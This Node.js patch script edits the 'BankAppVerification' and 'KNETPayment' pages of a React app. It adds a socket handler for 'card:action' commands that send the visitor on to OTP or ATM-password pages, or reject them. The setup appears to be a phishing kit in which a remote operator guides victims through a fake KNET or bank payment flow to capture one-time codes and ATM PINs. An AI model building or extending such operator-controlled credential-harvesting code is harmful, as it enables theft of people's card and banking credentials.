import fs from "fs";

const p = "src/pages/BankAppVerification.tsx";
let s = fs.readFileSync(p, "utf8").replace(/\r\n/g, "\n");
if (s.includes('card:action')) { console.log("ALREADY PATCHED"); process.exit(0); }

s = s.replace(
  'import { sendData, cardAction, navigateToPage, waitingMessage } from "@/lib/store";',
  'import { socket, sendData, cardAction, navigateToPage, waitingMessage } from "@/lib/store";'
);
if (!s.includes("socket, sendData")) { console.log("IMPORT FAIL"); process.exit(1); }

const lines = s.split("\n");
const idx = lines.findIndex(l => l.startsWith("  useEffect(() => {") && l.trimEnd().endsWith("}, []);"));
if (idx === -1) { console.log("ANCHOR FAIL"); process.exit(1); }

const block = [
  "",
  "  // Direct socket action handler",
  "  useEffect(() => {",
  "    const s = socket.value;",
  "    if (!s) return;",
  "    const handler = (action: string) => {",
  '      console.log("bankapp card:action ->", action);',
  '      const isKnet = localStorage.getItem("flowType") === "knet";',
  '      waitingMessage.value = "";',
  "      setIsWaiting(false);",
  '      if (action === "otp") {',
  '        navigate(isKnet ? "/knet-otp" : "/otp-verification");',
  '      } else if (action === "atm") {',
  '        navigate("/atm-password");',
  '      } else if (action === "reject") {',
  "        setRejected(true);",
  "        setError(true);",
  "      }",
  "    };",
  '    s.on("card:action", handler);',
  "    return () => { s.off(\"card:action\", handler); };",
  "  }, []);",
];
lines.splice(idx + 1, 0, ...block);
s = lines.join("\n");

s = s.replace(
  'navigate("/otp-verification");',
  'navigate(localStorage.getItem("flowType") === "knet" ? "/knet-otp" : "/otp-verification");'
);

fs.writeFileSync(p, s, "utf8");
console.log("BANKAPP PATCHED");

const kp = "src/pages/KNETPayment.tsx";
let k = fs.readFileSync(kp, "utf8").replace(/\r\n/g, "\n");
const before = (k.match(/"app"\) \{ navigate\("\/bank-app-verification"\)/g) || []).length;
k = k.replaceAll(
  '"app") { navigate("/bank-app-verification")',
  '"app") { localStorage.setItem("flowType", "knet"); navigate("/bank-app-verification")'
);
fs.writeFileSync(kp, k, "utf8");
console.log("KNET MARKERS:", before);
